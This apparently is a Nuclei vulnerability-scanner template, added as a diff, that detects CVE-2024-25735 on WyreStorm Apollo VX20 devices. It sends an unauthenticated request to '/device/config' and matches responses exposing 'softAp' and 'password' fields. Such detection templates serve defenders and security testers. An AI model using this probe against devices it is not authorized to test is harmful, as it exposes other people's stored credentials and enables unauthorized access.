@@ -1,0 +1,32 @@
+id: wyrestorm-apollo-vx20-information-disclosure
+info:
+  name: WyreStorm Apollo VX20 Information Disclosure Vulnerability (CVE-2024-25735)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2024-25735,information-disclosure
+  description: |
+    WyreStorm Apollo VX20 devices are vulnerable to an information disclosure vulnerability allowing unauthorized access to sensitive configuration details including passwords.
+
+http:
+  - method: GET
+    path:
+      - "/device/config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"softAp\""
+          - "\"password\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
